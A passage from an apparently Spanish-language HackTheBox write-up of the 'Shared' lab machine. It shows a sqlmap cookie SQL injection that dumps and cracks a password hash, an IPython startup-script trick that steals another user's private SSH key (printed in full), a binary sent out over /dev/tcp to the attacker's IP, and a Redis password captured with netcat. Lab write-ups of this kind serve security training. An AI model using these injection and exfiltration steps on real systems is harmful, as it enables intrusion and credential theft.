<span class="o">[</span>13:31:13] <span class="o">[</span>INFO] fetched data logged to text files under <span class="s1">'/home/miguel/.local/share/sqlmap/output/checkout.shared.htb'</span>

<span class="o">[</span><span class="k">*</span><span class="o">]</span> ending @ 13:31:13 /2024-05-26/
</code></pre></div></div>

<ul>
  <li>Ahora las tablas.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap sqlmap <span class="nt">-u</span> <span class="s2">"https://checkout.shared.htb/"</span> <span class="nt">--cookie</span><span class="o">=</span><span class="s1">'custom_cart={"*":"1"}'</span> <span class="nt">--technique</span> U <span class="nt">--union-cols</span> 3 <span class="nt">--batch</span> <span class="nt">-D</span> checkout <span class="nt">--tables</span>
        ___
       __H__
 ___ ___[,]_____ ___ ___  <span class="o">{</span>1.8.3#stable<span class="o">}</span>
|_ -| <span class="nb">.</span> <span class="o">[</span><span class="s2">"]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:31:48 /2024-05-26/

custom injection marker ('*') found in option '--headers/--user-agent/--referer/--cookie'. Do you want to process it? [Y/n/q] Y
[13:31:48] [INFO] resuming back-end DBMS 'mysql'
[13:31:48] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: Cookie #1* ((custom) HEADER)
    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns (custom)
    Payload: custom_cart={"</span><span class="s1">' UNION ALL SELECT NULL,CONCAT(CONCAT('</span>qzbxq<span class="s1">','</span>mDgXayJoyKUymjwMorkqAOaGsoWQfELOhEkSsvUp<span class="s1">'),'</span>qvbkq<span class="s1">'),NULL-- qbYb":"1"}
---
[13:31:49] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.18.0
back-end DBMS: MySQL 5 (MariaDB fork)
[13:31:49] [INFO] fetching tables for database: '</span>checkout<span class="s1">'
do you want to URL encode cookie values (implementation specific)? [Y/n] Y
Database: checkout
[2 tables]
+---------+
| user    |
| product |
+---------+

[13:31:49] [INFO] fetched data logged to text files under '</span>/home/miguel/.local/share/sqlmap/output/checkout.shared.htb<span class="s1">'

[*] ending @ 13:31:49 /2024-05-26/
</span></code></pre></div></div>

<ul>
  <li>Ahora vemos el <code class="language-plaintext highlighter-rouge">hash</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap sqlmap <span class="nt">-u</span> <span class="s2">"https://checkout.shared.htb/"</span> <span class="nt">--cookie</span><span class="o">=</span><span class="s1">'custom_cart={"*":"1"}'</span> <span class="nt">--technique</span> U <span class="nt">--union-cols</span> 3 <span class="nt">--batch</span> <span class="nt">-D</span> checkout <span class="nt">-T</span> user <span class="nt">--dump</span>
        ___
       __H__
 ___ ___[,]_____ ___ ___  <span class="o">{</span>1.8.3#stable<span class="o">}</span>
|_ -| <span class="nb">.</span> <span class="o">[(]</span>     | .<span class="s1">'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user'</span>s responsibility to obey all applicable <span class="nb">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="k">for </span>any misuse or damage caused by this program

<span class="o">[</span><span class="k">*</span><span class="o">]</span> starting @ 13:32:24 /2024-05-26/

custom injection marker <span class="o">(</span><span class="s1">'*'</span><span class="o">)</span> found <span class="k">in </span>option <span class="s1">'--headers/--user-agent/--referer/--cookie'</span><span class="nb">.</span> Do you want to process it? <span class="o">[</span>Y/n/q] Y
<span class="o">[</span>13:32:24] <span class="o">[</span>INFO] resuming back-end DBMS <span class="s1">'mysql'</span>
<span class="o">[</span>13:32:24] <span class="o">[</span>INFO] testing connection to the target URL
sqlmap resumed the following injection point<span class="o">(</span>s<span class="o">)</span> from stored session:
<span class="nt">---</span>
Parameter: Cookie <span class="c">#1* ((custom) HEADER)</span>
    Type: UNION query
    Title: Generic UNION query <span class="o">(</span>NULL<span class="o">)</span> - 4 columns <span class="o">(</span>custom<span class="o">)</span>
    Payload: <span class="nv">custom_cart</span><span class="o">={</span><span class="s2">"' UNION ALL SELECT NULL,CONCAT(CONCAT('qzbxq','mDgXayJoyKUymjwMorkqAOaGsoWQfELOhEkSsvUp'),'qvbkq'),NULL-- qbYb"</span>:<span class="s2">"1"</span><span class="o">}</span>
<span class="nt">---</span>
<span class="o">[</span>13:32:25] <span class="o">[</span>INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.18.0
back-end DBMS: MySQL 5 <span class="o">(</span>MariaDB fork<span class="o">)</span>
<span class="o">[</span>13:32:25] <span class="o">[</span>INFO] fetching columns <span class="k">for </span>table <span class="s1">'user'</span> <span class="k">in </span>database <span class="s1">'checkout'</span>
<span class="k">do </span>you want to URL encode cookie values <span class="o">(</span>implementation specific<span class="o">)</span>? <span class="o">[</span>Y/n] Y
<span class="o">[</span>13:32:25] <span class="o">[</span>INFO] fetching entries <span class="k">for </span>table <span class="s1">'user'</span> <span class="k">in </span>database <span class="s1">'checkout'</span>
<span class="o">[</span>13:32:25] <span class="o">[</span>INFO] recognized possible password hashes <span class="k">in </span>column <span class="s1">'password'</span>
<span class="k">do </span>you want to store hashes to a temporary file <span class="k">for </span>eventual further processing with other tools <span class="o">[</span>y/N] N
<span class="k">do </span>you want to crack them via a dictionary-based attack? <span class="o">[</span>Y/n/q] Y
<span class="o">[</span>13:32:26] <span class="o">[</span>INFO] using <span class="nb">hash </span>method <span class="s1">'md5_generic_passwd'</span>
what dictionary <span class="k">do </span>you want to use?
<span class="o">[</span>1] default dictionary file <span class="s1">'/usr/share/sqlmap/data/txt/wordlist.tx_'</span> <span class="o">(</span>press Enter<span class="o">)</span>
<span class="o">[</span>2] custom dictionary file
<span class="o">[</span>3] file with list of dictionary files
<span class="o">&gt;</span> 1
<span class="o">[</span>13:32:26] <span class="o">[</span>INFO] using default dictionary
<span class="k">do </span>you want to use common password suffixes? <span class="o">(</span>slow!<span class="o">)</span> <span class="o">[</span>y/N] N
<span class="o">[</span>13:32:26] <span class="o">[</span>INFO] starting dictionary-based cracking <span class="o">(</span>md5_generic_passwd<span class="o">)</span>
<span class="o">[</span>13:32:26] <span class="o">[</span>INFO] starting 2 processes
<span class="o">[</span>13:33:05] <span class="o">[</span>WARNING] no clear password<span class="o">(</span>s<span class="o">)</span> found
Database: checkout
Table: user
<span class="o">[</span>1 entry]
+----+----------------------------------+-------------+
| <span class="nb">id</span> | password                         | username    |
+----+----------------------------------+-------------+
| 1  | fc895d4eddc2fc12f995e18c865cf273 | james_mason |
+----+----------------------------------+-------------+

<span class="o">[</span>13:33:05] <span class="o">[</span>INFO] table <span class="s1">'checkout.`user`'</span> dumped to CSV file <span class="s1">'/home/miguel/.local/share/sqlmap/output/checkout.shared.htb/dump/checkout/user.csv'</span>
<span class="o">[</span>13:33:05] <span class="o">[</span>INFO] fetched data logged to text files under <span class="s1">'/home/miguel/.local/share/sqlmap/output/checkout.shared.htb'</span>

<span class="o">[</span><span class="k">*</span><span class="o">]</span> ending @ 13:33:05 /2024-05-26/
</code></pre></div></div>

<ul>
  <li>También podemos hacer un script en <code class="language-plaintext highlighter-rouge">python3</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content python3 exploit.py
james_mason:fc895d4eddc2fc12f995e18c865cf273
Hash guardado en <span class="s1">'hash.txt'</span>
Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>Raw-MD5 <span class="o">[</span>MD5 512/512 AVX512BW 16x3]<span class="o">)</span>
Warning: no OpenMP support <span class="k">for </span>this <span class="nb">hash type</span>, consider <span class="nt">--fork</span><span class="o">=</span>2
Press Ctrl-C to abort, or send SIGUSR1 to john process <span class="k">for </span>status
Soleil101        <span class="o">(</span>james_mason<span class="o">)</span>
1g 0:00:00:00 DONE <span class="o">(</span>2024-05-26 13:45<span class="o">)</span> 2.000g/s 4182Kp/s 4182Kc/s 4182KC/s Sportster1..Sjoerd
Use the <span class="s2">"--show --format=Raw-MD5"</span> options to display all of the cracked passwords reliably
Session completed.
0 password hashes cracked, 2 left
</code></pre></div></div>

<ul>
  <li>Aquí pueden ver el script <a href="https://github.com/MikeRega7/Scripts/blob/main/HackTheBox/Shared/exploit.py">https://github.com/MikeRega7/Scripts/blob/main/HackTheBox/Shared/exploit.py</a> .</li>
</ul>

<h2 id="shell-as-james_mason">Shell as james_mason</h2>

<ul>
  <li>Ahora nos conectamos por <code class="language-plaintext highlighter-rouge">ssh</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content ssh james_mason@10.10.11.172
The authenticity of host <span class="s1">'10.10.11.172 (10.10.11.172)'</span> can<span class="s1">'t be established.
ED25519 key fingerprint is SHA256:UXHSnbXewSQjJVOjGF5RVNToyJZqtdQyS8hgr5P8pWM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span>10.10.11.172<span class="s1">' (ED25519) to the list of known hosts.
james_mason@10.10.11.172'</span>s password:
Linux shared 5.10.0-16-amd64 <span class="c">#1 SMP Debian 5.10.127-1 (2022-06-30) x86_64</span>

The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
the exact distribution terms <span class="k">for </span>each program are described <span class="k">in </span>the
individual files <span class="k">in</span> /usr/share/doc/<span class="k">*</span>/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Jul 14 14:45:22 2022 from 10.10.14.4
james_mason@shared:~<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
</code></pre></div></div>

<ul>
  <li>Hay otro usuario a nivel de sistema.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>total 16
drwxr-xr-x  4 root        root        4096 Jul 14  2022 <span class="nb">.</span>
drwxr-xr-x 18 root        root        4096 Jul 14  2022 ..
drwxr-xr-x  4 dan_smith   dan_smith   4096 Jul 14  2022 dan_smith
drwxr-xr-x  2 james_mason james_mason 4096 Jul 14  2022 james_mason
james_mason@shared:/home<span class="err">$</span>
</code></pre></div></div>

<ul>
  <li>Estamos en el grupo <code class="language-plaintext highlighter-rouge">developer</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>james_mason@shared:/home<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>james_mason<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>james_mason<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>james_mason<span class="o">)</span>,1001<span class="o">(</span>developer<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Hay una carpeta la cual esta como grupo asignado <code class="language-plaintext highlighter-rouge">developer</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>james_mason@shared:/home<span class="nv">$ </span>find / <span class="nt">-group</span> developer 2&gt;/dev/null
/opt/scripts_review
</code></pre></div></div>

<ul>
  <li>Tenemos capacidad de escritura.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>james_mason@shared:/opt/scripts_review<span class="nv">$ </span><span class="nb">touch </span>zi
james_mason@shared:/opt/scripts_review<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
total 8
drwxrwx--- 2 root        developer   4096 May 26 15:53 <span class="nb">.</span>
drwxr-xr-x 3 root        root        4096 Jul 14  2022 ..
<span class="nt">-rw-r--r--</span> 1 james_mason james_mason    0 May 26 15:53 zi
</code></pre></div></div>

<ul>
  <li>Pero bueno poca cosa vamos a hacer vamos a usar <code class="language-plaintext highlighter-rouge">pspy</code> para ver tareas que se estén ejecutando en el sistema <a href="https://github.com/DominicBreuker/pspy/releases">https://github.com/DominicBreuker/pspy/releases</a>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/16.png" />
</p>

<ul>
  <li>
    <p>Ahora lo ejecutamos.</p>
  </li>
  <li>
    <p>Esta usando <code class="language-plaintext highlighter-rouge">ipython</code> y se mete ala ruta donde estábamos <a href="https://es.wikipedia.org/wiki/IPython">https://es.wikipedia.org/wiki/IPython</a>.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/17.png" />
</p>

<ul>
  <li>
    <p>Si investigamos encontramos como podemos abusar de <code class="language-plaintext highlighter-rouge">ipython</code> <a href="https://github.com/ipython/ipython/security/advisories/GHSA-pq7m-3gw7-gq5x">https://github.com/ipython/ipython/security/advisories/GHSA-pq7m-3gw7-gq5x</a>.</p>
  </li>
  <li>
    <p>Vamos a seguir el <code class="language-plaintext highlighter-rouge">Proof of concept</code> primeros vamos a crearnos un directorio después dentro del directorio <code class="language-plaintext highlighter-rouge">profile_default</code> crea otro directorio con el nombre <code class="language-plaintext highlighter-rouge">startup</code> y después crea un <code class="language-plaintext highlighter-rouge">script</code> con nombre <code class="language-plaintext highlighter-rouge">foo.py</code> y le mete contenido y podemos decirle que como el usuario que queremos convertirnos esta corriendo el proceso pues que cuando se inicie se ejecuta el script y nos de clave <code class="language-plaintext highlighter-rouge">id_rsa</code> y no la ponga en una ruta del sistema para poder conectarnos por <code class="language-plaintext highlighter-rouge">SSH</code> con ese usuario.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>james_mason@shared:/opt/scripts_review<span class="nv">$ </span><span class="nb">mkdir</span> <span class="nt">-m</span> 777 profile_default <span class="o">&amp;&amp;</span> <span class="nb">mkdir</span> <span class="nt">-m</span> 777 profile_default/startup <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s1">'import os; os.system("cat ~/.ssh/id_rsa &gt; /dev/shm/key")'</span> <span class="o">&gt;</span> profile_default/startup/foo.py
</code></pre></div></div>

<ul>
  <li>Ahora vamos a esperar que se ejecute la tarea para ver la <code class="language-plaintext highlighter-rouge">id_rsa</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>james_mason@shared:/opt/scripts_review<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /dev/shm/<span class="p">;</span> <span class="nb">cat </span>key
total 3036
<span class="nt">-rw-r--r--</span> 1 dan_smith   dan_smith      2602 May 26 16:22 key
<span class="nt">-rwxr-xr-x</span> 1 james_mason james_mason 3104768 May 26 15:54 pspy64
<span class="nb">cat</span>: key: No such file or directory
james_mason@shared:/opt/scripts_review<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /dev/shm/<span class="p">;</span> <span class="nb">cat</span> /dev/shm/key
james_mason@shared:/opt/scripts_review<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /dev/shm/<span class="p">;</span> <span class="nb">cat</span> /dev/shm/key
total 3036
<span class="nt">-rw-r--r--</span> 1 dan_smith   dan_smith      2602 May 26 16:22 key
<span class="nt">-rwxr-xr-x</span> 1 james_mason james_mason 3104768 May 26 15:54 pspy64
<span class="nt">-----BEGIN</span> OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAvWFkzEQw9usImnZ7ZAzefm34r+54C9vbjymNl4pwxNJPaNSHbdWO
+/+OPh0/KiPg70GdaFWhgm8qEfFXLEXUbnSMkiB7JbC3fCfDCGUYmp9QiiQC0xiFeaSbvZ
FwA4NCZouzAW1W/ZXe60LaAXVAlEIbuGOVcNrVfh+XyXDFvEyre5BWNARQSarV5CGXk6ku
sjib5U7vdKXASeoPSHmWzFismokfYy8Oyupd8y1WXA4jczt9qKUgBetVUDiai1ckFBePWl
4G3yqQ2ghuHhDPBC+lCl3mMf1XJ7Jgm3sa+EuRPZFDCUiTCSxA8LsuYrWAwCtxJga31zWx
FHAVThRwfKb4Qh2l9rXGtK6G05+DXWj+OAe/Q34gCMgFG4h3mPw7tRz2plTRBQfgLcrvVD
oQtePOEc/XuVff+kQH7PU9J1c0F/hC7gbklm2bA8YTNlnCQ2Z2Z+HSzeEXD5rXtCA69F4E
u1FCodLROALNPgrAM4LgMbD3xaW5BqZWrm24uP/lAAAFiPY2n2r2Np9qAAAAB3NzaC1yc2
EAAAGBAL1hZMxEMPbrCJp2e2QM3n5t+K/ueAvb248pjZeKcMTST2jUh23Vjvv/jj4dPyoj
4O9BnWhVoYJvKhHxVyxF1G50jJIgeyWwt3wnwwhlGJqfUIokAtMYhXmkm72RcAODQmaLsw
FtVv2V3utC2gF1QJRCG7hjlXDa1X4fl8lwxbxMq3uQVjQEUEmq1eQhl5OpLrI4m+VO73Sl
wEnqD0h5lsxYrJqJH2MvDsrqXfMtVlwOI3M7failIAXrVVA4motXJBQXj1peBt8qkNoIbh
4QzwQvpQpd5jH9VyeyYJt7GvhLkT2RQwlIkwksQPC7LmK1gMArcSYGt9c1sRRwFU4UcHym
+EIdpfa1xrSuhtOfg11o/jgHv0N+IAjIBRuId5j8O7Uc9qZU0QUH4C3K71Q6ELXjzhHP17
lX3/pEB+z1PSdXNBf4Qu4G5JZtmwPGEzZZwkNmdmfh0s3hFw+a17QgOvReBLtRQqHS0TgC
zT4KwDOC4DGw98WluQamVq5tuLj/5QAAAAMBAAEAAAGBAK05auPU9BzHO6Vd/tuzUci/ep
wiOrhOMHSxA4y72w6NeIlg7Uev8gva5Bc41VAMZXEzyXFn8kXGvOqQoLYkYX1vKi13fG0r
SYpNLH5/SpQUaa0R52uDoIN15+bsI1NzOsdlvSTvCIUIE1GKYrK2t41lMsnkfQsvf9zPtR
1TA+uLDcgGbHNEBtR7aQ41E9rDA62NTjvfifResJZre/NFFIRyD9+C0az9nEBLRAhtTfMC
E7cRkY0zDSmc6vpn7CTMXOQvdLao1WP2k/dSpwiIOWpSLIbpPHEKBEFDbKMeJ2G9uvxXtJ
f3uQ14rvy+tRTog/B3/PgziSb6wvHri6ijt6N9PQnKURVlZbkx3yr397oVMCiTe2FA+I/Y
pPtQxpmHjyClPWUsN45PwWF+D0ofLJishFH7ylAsOeDHsUVmhgOeRyywkDWFWMdz+Ke+XQ
YWfa9RiI5aTaWdOrytt2l3Djd1V1/c62M1ekUoUrIuc5PS8JNlZQl7fyfMSZC9mL+iOQAA
AMEAy6SuHvYofbEAD3MS4VxQ+uo7G4sU3JjAkyscViaAdEeLejvnn9i24sLWv9oE9/UOgm
2AwUg3cT7kmKUdAvBHsj20uwv8a1ezFQNN5vxTnQPQLTiZoUIR7FDTOkQ0W3hfvjznKXTM
wictz9NZYWpEZQAuSX2QJgBJc1WNOtrgJscNauv7MOtZYclqKJShDd/NHUGPnNasHiPjtN
CRr7thGmZ6G9yEnXKkjZJ1Neh5Gfx31fQBaBd4XyVFsvUSphjNAAAAwQD4Yntc2zAbNSt6
GhNb4pHYwMTPwV4DoXDk+wIKmU7qs94cn4o33PAA7ClZ3ddVt9FTkqIrIkKQNXLQIVI7EY
Jg2H102ohz1lPWC9aLRFCDFz3bgBKluiS3N2SFbkGiQHZoT93qn612b+VOgX1qGjx1lZ/H
I152QStTwcFPlJ0Wu6YIBcEq4Rc+iFqqQDq0z0MWhOHYvpcsycXk/hIlUhJNpExIs7TUKU
SJyDK0JWt2oKPVhGA62iGGx2+cnGIoROcAAADBAMMvzNfUfamB1hdLrBS/9R+zEoOLUxbE
SENrA1qkplhN/wPta/wDX0v9hX9i+2ygYSicVp6CtXpd9KPsG0JvERiVNbwWxD3gXcm0BE
wMtlVDb4WN1SG5Cpyx9ZhkdU+t0gZ225YYNiyWob3IaZYWVkNkeijRD+ijEY4rN41hiHlW
HPDeHZn0yt8fTeFAm+Ny4+8+dLXMlZM5quPoa0zBbxzMZWpSI9E6j6rPWs2sJmBBEKVLQs
<span class="nv">tfJMvuTgb3NhHvUwAAAAtyb290QHNoYXJlZAECAwQFBg</span><span class="o">==</span>
<span class="nt">-----END</span> OPENSSH PRIVATE KEY-----
</code></pre></div></div>

<h2 id="shell-as-dan_smith">Shell as dan_smith</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content nano id_rsa
➜  content <span class="nb">chmod </span>600 id_rsa
➜  content ssh <span class="nt">-i</span> id_rsa dan_smith@10.10.11.172
Linux shared 5.10.0-16-amd64 <span class="c">#1 SMP Debian 5.10.127-1 (2022-06-30) x86_64</span>

The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
the exact distribution terms <span class="k">for </span>each program are described <span class="k">in </span>the
individual files <span class="k">in</span> /usr/share/doc/<span class="k">*</span>/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Jul 14 14:43:34 2022 from 10.10.14.4
dan_smith@shared:~<span class="err">$</span>
</code></pre></div></div>

<h2 id="user-flag">User flag</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dan_smith@shared:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
24a48911a42a2b121474cc933cdc48db
dan_smith@shared:~<span class="err">$</span>
</code></pre></div></div>

<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>

<ul>
  <li>Estamos en el grupo <code class="language-plaintext highlighter-rouge">sysadmin</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dan_smith@shared:~<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>dan_smith<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>dan_smith<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1002<span class="o">(</span>dan_smith<span class="o">)</span>,1001<span class="o">(</span>developer<span class="o">)</span>,1003<span class="o">(</span>sysadmin<span class="o">)</span>
dan_smith@shared:~<span class="err">$</span>
</code></pre></div></div>

<ul>
  <li>Vamos a ver archivos donde el grupo sea para <code class="language-plaintext highlighter-rouge">sysadmin</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dan_smith@shared:~<span class="nv">$ </span>find / <span class="nt">-group</span> sysadmin 2&gt;/dev/null
/usr/local/bin/redis_connector_dev
dan_smith@shared:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /usr/local/bin/redis_connector_dev
<span class="nt">-rwxr-x---</span> 1 root sysadmin 5974154 Mar 20  2022 /usr/local/bin/redis_connector_dev
dan_smith@shared:~<span class="err">$</span>
</code></pre></div></div>

<ul>
  <li>Y es un binario.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dan_smith@shared:/usr/local/bin<span class="nv">$ </span>file redis_connector_dev
redis_connector_dev: ELF 64-bit LSB executable, x86-64, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, Go <span class="nv">BuildID</span><span class="o">=</span>sdGIDsCGb51jonJ_67fq/_JkvEmzwH9g6f0vQYeDG/iH1iXHhyzaDZJ056wX9s/7UVi3T2i2LVCU8nXlHgr, not stripped
</code></pre></div></div>

<ul>
  <li>Si lo ejecutamos vemos esto <a href="https://aws.amazon.com/es/elasticache/what-is-redis/">https://aws.amazon.com/es/elasticache/what-is-redis/</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dan_smith@shared:/usr/local/bin<span class="nv">$ </span>./redis_connector_dev
<span class="o">[</span>+] Logging to redis instance using password...

INFO <span class="nb">command </span>result:
<span class="c"># Server</span>
redis_version:6.0.15
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:4610f4c3acf7fb25
redis_mode:standalone
os:Linux 5.10.0-16-amd64 x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:10.2.1
process_id:3239
run_id:4450568378af75bfe290423a2b40a410f84df22d
tcp_port:6379
uptime_in_seconds:3
uptime_in_days:0
hz:10
configured_hz:10
lru_clock:5479317
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf
io_threads_active:0
 &lt;nil&gt;
</code></pre></div></div>

<ul>
  <li>Si escribimos <code class="language-plaintext highlighter-rouge">redis</code> y tabulamos vemos varios <code class="language-plaintext highlighter-rouge">redis</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dan_smith@shared:~<span class="nv">$ </span>redis
redis-benchmark      redis-check-aof      redis-check-rdb      redis-cli            redis_connector_dev  redis-server
dan_smith@shared:~<span class="nv">$ </span>redis
</code></pre></div></div>

<ul>
  <li>
    <p>Aquí nos dicen como podemos enumerar <code class="language-plaintext highlighter-rouge">redis</code> <a href="https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis">https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis</a>.</p>
  </li>
  <li>
    <p>Nos conectamos pero no podemos ver información.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dan_smith@shared:~<span class="nv">$ </span>redis-cli
127.0.0.1:6379&gt; INFO
NOAUTH Authentication required.
127.0.0.1:6379&gt;
</code></pre></div></div>

<ul>
  <li>Si probamos con las credenciales que tenemos no funcionan.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>127.0.0.1:6379&gt; AUTH james_mason Soleil101
<span class="o">(</span>error<span class="o">)</span> WRONGPASS invalid username-password pair
127.0.0.1:6379&gt;
</code></pre></div></div>

<ul>
  <li>Para hacer pruebas desde nuestro entorno de atacante vamos a mandarnos el binario.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dan_smith@shared:~<span class="nv">$ </span><span class="nb">cat</span> &lt; /usr/local/bin/redis_connector_dev <span class="o">&gt;</span> /dev/tcp/10.10.14.55/443
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content nc <span class="nt">-nlvp</span> 443 <span class="o">&gt;</span> redis_connector_dev
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.55] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.172] 51872
</code></pre></div></div>

<ul>
  <li>Vamos a ejecutarlo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">chmod</span> +x redis_connector_dev
➜  content ./redis_connector_dev
<span class="o">[</span>+] Logging to redis instance using password...

INFO <span class="nb">command </span>result:
 dial tcp <span class="o">[</span>::1]:6379: connect: connection refused
</code></pre></div></div>

<ul>
  <li>El error básicamente es que no hay conexión con el puerto en escucha entonces nos vamos a poner en escucha en ese puerto para ver que nos llega.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content ./redis_connector_dev
<span class="o">[</span>+] Logging to redis instance using password...

INFO <span class="nb">command </span>result:
</code></pre></div></div>

<ul>
  <li>Ahora podemos ver la contraseña.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ nc <span class="nt">-nlvp</span> 6379
listening on <span class="o">[</span>any] 6379 ...
connect to <span class="o">[</span>127.0.0.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>127.0.0.1] 55836
<span class="k">*</span>2
<span class="nv">$4</span>
auth
<span class="nv">$16</span>
<span class="nv">F2WHqJUz2WEz</span><span class="o">=</span>Gqq
</code></pre></div></div>

<ul>
  <li>Como tenemos la contraseña ya nos podemos autenticar.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dan_smith@shared:~<span class="nv">$ </span>redis-cli
127.0.0.1:6379&gt; AUTH <span class="nv">F2WHqJUz2WEz</span><span class="o">=</span>Gqq
OK
127.0.0.1:6379&gt; INFO
<span class="c"># Server</span>
redis_version:6.0.15
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:4610f4c3acf7fb25
redis_mode:standalone
os:Linux 5.10.0-16-amd64 x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:10.2.1
process_id:3445
run_id:4d12a99f866d54b324c8dfa89c18f417d25a6fe8
tcp_port:6379
uptime_in_seconds:16
uptime_in_days:0
hz:10
configured_hz:10
lru_clock:5479871
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf
io_threads_active:0

<span class="c"># Clients</span>
connected_clients:1
client_recent_max_input_buffer:8
client_recent_max_output_buffer:0
blocked_clients:0
tracking_clients:0
clients_in_timeout_table:0

<span class="c"># Memory</span>
used_memory:873328
used_memory_human:852.86K
used_memory_rss:15282176
used_memory_rss_human:14.57M
used_memory_peak:873328
used_memory_peak_human:852.86K
used_memory_peak_perc:100.17%
used_memory_overhead:830336
used_memory_startup:809832
used_memory_dataset:42992
used_memory_dataset_perc:67.71%
allocator_allocated:1287608
allocator_active:1605632
allocator_resident:4182016
total_system_memory:2078982144
total_system_memory_human:1.94G
used_memory_lua:41984
used_memory_lua_human:41.00K
used_memory_scripts:0
used_memory_scripts_human:0B
number_of_cached_scripts:0
maxmemory:0
maxmemory_human:0B
maxmemory_policy:noeviction
allocator_frag_ratio:1.25
allocator_frag_bytes:318024
